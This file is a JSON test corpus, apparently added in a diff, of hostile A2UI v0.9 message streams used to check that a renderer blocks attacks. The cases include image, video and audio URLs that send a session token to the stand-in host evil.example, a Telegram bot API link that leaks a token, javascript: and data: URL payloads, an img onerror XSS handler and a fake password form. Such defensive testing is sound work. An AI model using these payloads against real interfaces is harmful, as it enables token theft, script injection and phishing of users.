@@ -1,0 +1,218 @@
+{
+  "version": "2026-10-08",
+  "description": "Hostile A2UI v0.9 message streams for the basic catalog: URLs that reach the renderer through data binding and formatString, openUrl targets outside http and https, and Text that breaks the catalog contract (Markdown without HTML, images or links). Same invariants as evil-markdown.json, plus noOpenScheme, noOpenTo and mustOpen for openUrl.",
+  "cases": [
+    {
+      "id": "a2ui-image-literal", "category": "exfiltration", "title": "Image.url to a remote host with data in the query",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "img", "component": "Image", "url": "https://evil.example/p.png?d=c2Vzc2lvbi10b2tlbi1mcm9tLXRoZS1jb252ZXJzYXRpb24"}]}}
+      ],
+      "expect": {"noRequestTo": ["evil.example"]}
+    },
+    {
+      "id": "a2ui-image-bound", "category": "exfiltration", "title": "Image.url bound to the data model",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "img", "component": "Image", "url": {"path": "/hero"}}]}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/hero", "value": "https://evil.example/hero.png?d=c2Vzc2lvbi10b2tlbi1mcm9tLXRoZS1jb252ZXJzYXRpb24"}}
+      ],
+      "expect": {"noRequestTo": ["evil.example"]}
+    },
+    {
+      "id": "a2ui-image-swapped", "category": "exfiltration", "title": "bound Image.url swapped after a clean first render",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "img", "component": "Image", "url": {"path": "/hero"}}]}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/", "value": {"hero": "{{origin}}/corpus/.build/ok.svg"}}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/hero", "value": "https://evil.example/late.png?d=c2Vzc2lvbi10b2tlbi1mcm9tLXRoZS1jb252ZXJzYXRpb24"}}
+      ],
+      "expect": {"noRequestTo": ["evil.example"]}
+    },
+    {
+      "id": "a2ui-format-string-data", "category": "exfiltration", "title": "formatString puts data-model values into an image path",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "avatar", "component": "Image", "url": {"call": "formatString", "args": {"value": "https://evil.example/${/user/token}.png"}, "returnType": "string"}}]}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/user", "value": {"token": "c2Vzc2lvbi10b2tlbi1mcm9tLXRoZS1jb252ZXJzYXRpb24"}}}
+      ],
+      "expect": {"noRequestTo": ["evil.example"]}
+    },
+    {
+      "id": "a2ui-format-string-host", "category": "exfiltration", "title": "formatString takes the whole origin from the data model",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "avatar", "component": "Image", "url": {"call": "formatString", "args": {"value": "${/cdn}/avatar.png?u=${/user/email}"}, "returnType": "string"}}]}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/", "value": {"cdn": "https://evil.example", "user": {"email": "victim@example.com"}}}}
+      ],
+      "expect": {"noRequestTo": ["evil.example"]}
+    },
+    {
+      "id": "a2ui-theme-icon", "category": "exfiltration", "title": "theme.iconUrl in createSurface to a remote host",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json", "theme": {"iconUrl": "https://evil.example/icon.png?d=c2Vzc2lvbi10b2tlbi1mcm9tLXRoZS1jb252ZXJzYXRpb24"}}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "t", "component": "Text", "text": "Hello"}]}}
+      ],
+      "expect": {"noRequestTo": ["evil.example"], "mustContainText": ["Hello"]}
+    },
+    {
+      "id": "a2ui-video", "category": "exfiltration", "title": "Video.url to a remote host (players fetch metadata on their own)",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "v", "component": "Video", "url": "https://evil.example/v.mp4?d=c2Vzc2lvbi10b2tlbi1mcm9tLXRoZS1jb252ZXJzYXRpb24"}]}}
+      ],
+      "expect": {"noRequestTo": ["evil.example"]}
+    },
+    {
+      "id": "a2ui-audio", "category": "exfiltration", "title": "AudioPlayer.url bound to the data model",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "a", "component": "AudioPlayer", "url": {"path": "/track"}}]}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/track", "value": "https://evil.example/a.mp3?d=c2Vzc2lvbi10b2tlbi1mcm9tLXRoZS1jb252ZXJzYXRpb24"}}
+      ],
+      "expect": {"noRequestTo": ["evil.example"]}
+    },
+    {
+      "id": "a2ui-text-markdown-image", "category": "exfiltration", "title": "Markdown image in Text (the catalog allows no images)",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "t", "component": "Text", "text": "Your report is ready.\n\n![chart](https://evil.example/c.png?d=c2Vzc2lvbi10b2tlbi1mcm9tLXRoZS1jb252ZXJzYXRpb24)"}]}}
+      ],
+      "expect": {"noRequestTo": ["evil.example"], "noElements": ["img"], "mustContainText": ["Your report is ready."]}
+    },
+    {
+      "id": "a2ui-text-bound-swap", "category": "exfiltration", "title": "bound Text swapped from plain text to an HTML image",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "t", "component": "Text", "text": {"path": "/msg"}}]}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/msg", "value": "Loading..."}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/msg", "value": "Done. <img src=\"https://evil.example/t.png?d=c2Vzc2lvbi10b2tlbi1mcm9tLXRoZS1jb252ZXJzYXRpb24\">"}}
+      ],
+      "expect": {"noRequestTo": ["evil.example"], "noElements": ["img"], "mustContainText": ["Done."]}
+    },
+    {
+      "id": "a2ui-openurl-sink", "category": "exfiltration", "title": "openUrl to a chat bot API, the message assembled by formatString",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "go", "component": "Button", "child": "go-label", "action": {"functionCall": {"call": "openUrl", "args": {"url": {"call": "formatString", "args": {"value": "https://api.telegram.org/bot123456:AAH-x/sendMessage?chat_id=1&text=${/user/token}"}, "returnType": "string"}}, "returnType": "void"}}}]}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/user", "value": {"token": "sk-live-1"}}}
+      ],
+      "activate": ["go"],
+      "expect": {"noOpenTo": ["api.telegram.org"]}
+    },
+    {
+      "id": "a2ui-text-img-onerror", "category": "script-execution", "title": "HTML with an event handler in bound Text",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "t", "component": "Text", "text": {"path": "/msg"}}]}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/msg", "value": "Hi <img src=x onerror=\"p('a2ui-text-img-onerror')\">"}}
+      ],
+      "expect": {"noExecution": true, "noAttributes": ["^on"], "mustContainText": ["Hi"]}
+    },
+    {
+      "id": "a2ui-openurl-javascript", "category": "url-schemes", "title": "openUrl with a javascript: URL",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "go", "component": "Button", "child": "go-label", "action": {"functionCall": {"call": "openUrl", "args": {"url": "javascript:p('a2ui-openurl-javascript')"}, "returnType": "void"}}}]}}
+      ],
+      "activate": ["go"],
+      "expect": {"noExecution": true, "noOpenScheme": ["javascript"]}
+    },
+    {
+      "id": "a2ui-openurl-bound-javascript", "category": "url-schemes", "title": "openUrl bound to a mixed-case javascript: URL",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "go", "component": "Button", "child": "go-label", "action": {"functionCall": {"call": "openUrl", "args": {"url": {"path": "/next"}}, "returnType": "void"}}}]}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/next", "value": "JaVaScRiPt:p('a2ui-openurl-bound-javascript')"}}
+      ],
+      "activate": ["go"],
+      "expect": {"noExecution": true, "noOpenScheme": ["javascript"]}
+    },
+    {
+      "id": "a2ui-openurl-data", "category": "url-schemes", "title": "openUrl with a data: HTML document",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "go", "component": "Button", "child": "go-label", "action": {"functionCall": {"call": "openUrl", "args": {"url": "data:text/html,<script>p('a2ui-openurl-data')</script>"}, "returnType": "void"}}}]}}
+      ],
+      "activate": ["go"],
+      "expect": {"noExecution": true, "noOpenScheme": ["data"]}
+    },
+    {
+      "id": "a2ui-openurl-mailto", "category": "url-schemes", "title": "openUrl outside http and https (mailto: with a prefilled body)",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "go", "component": "Button", "child": "go-label", "action": {"functionCall": {"call": "openUrl", "args": {"url": {"call": "formatString", "args": {"value": "mailto:support@evil.example?body=${/user/token}"}, "returnType": "string"}}, "returnType": "void"}}}]}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/user", "value": {"token": "c2Vzc2lvbi10b2tlbi1mcm9tLXRoZS1jb252ZXJzYXRpb24"}}}
+      ],
+      "activate": ["go"],
+      "expect": {"noOpenScheme": ["mailto"]}
+    },
+    {
+      "id": "a2ui-text-link", "category": "ui-spoofing", "title": "Markdown link in Text (the catalog allows no links)",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "t", "component": "Text", "text": "Your session expired. [Sign in again](https://evil.example/login)"}]}}
+      ],
+      "expect": {"noElements": ["a"], "mustContainText": ["Sign in again"]}
+    },
+    {
+      "id": "a2ui-text-form", "category": "ui-spoofing", "title": "password form in Text",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "t", "component": "Text", "text": "Please confirm:\n\n<form action=\"https://evil.example/collect\"><input type=\"password\" name=\"pw\"><button>OK</button></form>"}]}}
+      ],
+      "expect": {"noElements": ["form", "input"], "mustContainText": ["Please confirm:"]}
+    },
+    {
+      "id": "a2ui-text-overlay", "category": "ui-spoofing", "title": "styled overlay in Text",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "t", "component": "Text", "text": "<div style=\"position:fixed;inset:0;background:#fff;z-index:9999\">Session expired</div>"}]}}
+      ],
+      "expect": {"noAttributes": ["^style$"]}
+    },
+    {
+      "id": "a2ui-guard-image-same-origin", "category": "guard", "title": "same-origin Image.url must render",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "img", "component": "Image", "url": "{{origin}}/corpus/.build/ok.svg"}]}}
+      ],
+      "expect": {"mustHave": ["img"]}
+    },
+    {
+      "id": "a2ui-guard-image-relative", "category": "guard", "title": "relative Image.url bound to the data model must render",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "img", "component": "Image", "url": {"path": "/logo"}}]}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/logo", "value": "./ok.svg"}}
+      ],
+      "expect": {"mustHave": ["img"]}
+    },
+    {
+      "id": "a2ui-guard-format-string", "category": "guard", "title": "formatString assembling a same-origin image must render",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "img", "component": "Image", "url": {"call": "formatString", "args": {"value": "{{origin}}/corpus/.build/${/name}.svg"}, "returnType": "string"}}]}},
+        {"version": "v0.9", "updateDataModel": {"surfaceId": "s", "path": "/name", "value": "ok"}}
+      ],
+      "expect": {"mustHave": ["img"]}
+    },
+    {
+      "id": "a2ui-guard-text-markdown", "category": "guard", "title": "Markdown formatting in Text must survive",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "t", "component": "Text", "text": "# Summary\n\nA paragraph with **bold** and `code`.\n\n- one\n- two"}]}}
+      ],
+      "expect": {"mustHave": ["h1", "strong", "code", "li"], "mustContainText": ["Summary", "one", "two"]}
+    },
+    {
+      "id": "a2ui-guard-openurl-https", "category": "guard", "title": "openUrl to an https page must open",
+      "messages": [
+        {"version": "v0.9", "createSurface": {"surfaceId": "s", "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json"}},
+        {"version": "v0.9", "updateComponents": {"surfaceId": "s", "components": [{"id": "docs", "component": "Button", "child": "docs-label", "action": {"functionCall": {"call": "openUrl", "args": {"url": "https://docs.example.com/help"}, "returnType": "void"}}}]}}
+      ],
+      "activate": ["docs"],
+      "expect": {"mustOpen": ["https://docs.example.com/help"]}
+    }
+  ]
+}
